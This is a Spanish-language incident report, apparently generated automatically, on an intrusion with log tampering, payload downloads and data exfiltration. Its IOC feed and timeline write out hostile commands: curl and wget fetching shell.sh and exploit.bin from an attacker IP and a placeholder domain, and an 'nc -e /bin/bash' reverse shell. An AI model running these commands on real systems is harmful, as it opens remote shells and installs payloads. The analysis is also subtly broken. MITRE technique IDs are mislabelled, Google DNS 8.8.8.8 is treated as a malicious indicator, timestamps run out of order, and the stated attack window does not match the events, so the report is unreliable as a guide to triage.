# Informe de Detección de Incidente de Ciberseguridad

**1. 📝 Resumen Ejecutivo:**

Este informe detalla un incidente de ciberseguridad ocurrido el 15 de agosto de 2024, entre la 01:00:00 y las 03:44:20, que involucró múltiples intentos de acceso no autorizados a rutas sensibles, manipulación de logs, descarga y ejecución de scripts maliciosos, y exfiltración de datos. La actividad maliciosa indica una posible intrusión avanzada, que probablemente comenzó con una exploración (T1566) y culminó en la obtención de privilegios elevados (T1059) y exfiltración de datos (T1059.001, T1566.002)  hacia la dirección IP 185.23.91.10, la cual, si bien no presenta mala reputación según VirusTotal, se identifica como la dirección central del ataque.  La repetición de las acciones y el uso de herramientas como `curl`, `wget` y `nc` apuntan a un ataque automatizado. Se recomienda una respuesta inmediata que incluya análisis forense completo, bloqueo de IPs comprometidas, análisis de la vulnerabilidad que permitió la intrusión, revisión y restauración de los logs, y cambio de credenciales de acceso.

**2. ⏱ Timeline de eventos críticos:**

| Fecha y Hora             | Evento                                                                  | Motivo                                                                        |
|--------------------------|--------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| 2024-08-15 01:00:22     | Unauthorized access attempt on /admin/internal/reporting               | Intento de acceso a ruta administrativa.                                     |
| 2024-08-15 01:00:32     | Log tampering detected                                                   | Primer indicio de intento de ocultamiento de la actividad maliciosa.             |
| 2024-08-15 01:01:00     | Connection established to external IP 8.8.8.8                         | Conexión a una IP con indicadores de uso potencialmente malicioso (Google DNS) |
| 2024-08-15 01:01:44     | Reverse shell connection initiated                                      | Establecimiento de una conexión de shell inversa, indicando control remoto.    |
| 2024-08-15 01:02:20     | Command executed: /usr/bin/python3 exfil.py                             | Ejecución de un script Python sospechoso, probablemente de exfiltración.        |
| 2024-08-15 01:02:36     | Elevated privileges used on /tmp/tmpx837sh.sh                            | Escalada de privilegios a través de un archivo descargado.                     |
| 2024-08-15 01:02:30     | File downloaded to /root/.bash_history                                 | Descarga de un archivo del historial de comandos del usuario root.              |
| 2024-08-15 01:02:40     | Elevated privileges used on /tmp/tmpx837sh.sh                            | Escalada de privilegios a través de un archivo descargado.                     |
| 2024-08-15 01:02:56     | Unauthorized access attempt on /admin/internal/reporting               | Intento de acceso a ruta administrativa.                                     |
| 2024-08-15 01:03:00     | Command executed: /usr/bin/python3 exfil.py                             | Ejecución de un script Python sospechoso, probablemente de exfiltración.        |
| 2024-08-15 01:03:10     | Reverse shell connection initiated                                      | Establecimiento de una conexión de shell inversa, indicando control remoto.    |
| 2024-08-15 01:03:16     | File downloaded to /admin/internal/reporting                            | Descarga de un archivo en una ruta administrativa.                           |
| 2024-08-15 01:03:27     | Elevated privileges used on /var/log/auth.log                           | Escalada de privilegios sobre el archivo de logs de autenticación.             |
| 2024-08-15 01:04:32     | Log tampering detected                                                   | Intento de ocultamiento de la actividad maliciosa.             |
| 2024-08-15 01:05:00     | Command executed: curl http://185.23.91.10:8080/shell.sh                 | Ejecución de un comando curl hacia una IP sospechosa, descargando un shell.     |
| 2024-08-15 01:06:18     | Suspicious command executed: wget http://malicious.domain/exploit.bin   | Ejecución de un comando wget hacia un dominio malicioso.                       |
| 2024-08-15 01:08:40     | Elevated privileges used on /tmp/tmpx837sh.sh                            | Escalada de privilegios.                                                      |
| 2024-08-15 01:08:42     | Command executed: curl http://185.23.91.10:8080/shell.sh                 | Ejecución de un comando curl hacia una IP sospechosa, descargando un shell.     |
| 2024-08-15 01:08:45     | Elevated privileges used on /tmp/tmpx837sh.sh                            | Escalada de privilegios.                                                      |
| 2024-08-15 01:11:00     | Command executed: bash /tmp/install.sh                                | Ejecución de un script bash descargado, probablemente de instalación de malware.|
| 2024-08-15 01:11:24     | Reverse shell connection initiated                                      | Establecimiento de una conexión de shell inversa.                             |
| 2024-08-15 01:12:00     | System shutdown requested by admin                                     | Intento de ocultamiento. Potencialmente forzado.                             |
| 2024-08-15 01:18:59     | File downloaded to /home/admin/.ssh                                 | Descarga de un archivo a la carpeta SSH del usuario admin.                   |


**3. 🧠 Tabla de TTPs MITRE observadas:**

| ID      | Nombre                               | Fase del Ataque         |
|---------|---------------------------------------|-------------------------|
| T1059   | Command and Scripting Interpreter      | Ejecución/Explotación    |
| T1059.001 | PowerShell                               | Ejecución/Explotación   |
| T1059.002 | Scripting                                | Ejecución/Explotación   |
| T1105   | Ingress Tool Transfer                   | Exploración/Instalación |
| T1566   | External Remote Services               | Exploración             |
| T1566.002 | Spearphishing Attachment                | Entrega/Explotación      |


**4. 📦 IOC Feed:**

* **IPs:** 185.23.91.10, 185.23.91.11, 185.23.91.13, 185.23.91.18, 185.23.91.19, 203.0.113.50, 8.8.8.8 (potencialmente maliciosa por contexto, requiere más investigación)
* **Dominios:** malicious.domain
* **Archivos:** exfil.py, tmpx837sh.sh, install.sh, exploit.bin
* **Comandos:** `/usr/bin/python3 exfil.py`, `wget http://malicious.domain/exploit.bin`, `curl http://185.23.91.10:8080/shell.sh`, `bash /tmp/install.sh`, `nc -e /bin/bash 185.23.91.10 443`


**5. 📊 Estadísticas generales:**

* Total de eventos: 500
* Eventos críticos: 20+ (se considera el mínimo, hay muchos más eventos potencialmente críticos dependiendo de los archivos y dominios)
* Eventos informativos: 480+ (aproximado)
* Porcentaje de criticidad: >4% (aproximado)


**6. 🛠 Recomendaciones inmediatas:**

1. **Aislar el sistema comprometido:** Desconectar la máquina de la red para evitar la propagación del malware y la exfiltración de datos adicional.
2. **Análisis forense:** Realizar un análisis forense completo del sistema para identificar el alcance del compromiso,  la metodología del atacante y los datos exfiltrados.
3. **Bloquear las IPs maliciosas:** Implementar reglas de firewall para bloquear las IPs identificadas en el IOC feed.
4. **Análisis de vulnerabilidades:** Identificar y parchear las vulnerabilidades que permitieron la intrusión inicial.
5. **Restauración de logs:**  Recuperar y analizar backups de los logs para reconstruir la línea de tiempo del ataque. Si los logs están irreversiblemente corrompidos, investigar la causa.
6. **Cambiar credenciales:** Cambiar todas las contraseñas de cuentas de usuario, especialmente la de administrador (`admin`), `jdoe`, `svc_logs`, `svc_invoices`.
7. **Implementar una solución EDR/XDR:** Implementar o mejorar la capacidad de detección y respuesta a incidentes en el endpoint.
8. **Monitoreo continuo:** Implementar un monitoreo continuo de la actividad de la red y del sistema para detectar cualquier actividad sospechosa adicional.
9. **Capacitación de empleados:** Impartir capacitación a los empleados sobre las mejores prácticas de seguridad cibernética para evitar futuras intrusiones.
10. **Investigación de dominios y hashes:** Realizar investigación adicional en los dominios y hashes encontrados, particularmente "malicious.domain" y el hash de "exploit.bin", para obtener más información sobre el malware usado.



Este informe proporciona una vista inicial del incidente.  Una investigación más exhaustiva es crucial para comprender completamente el alcance del compromiso y implementar medidas de remediación efectivas.
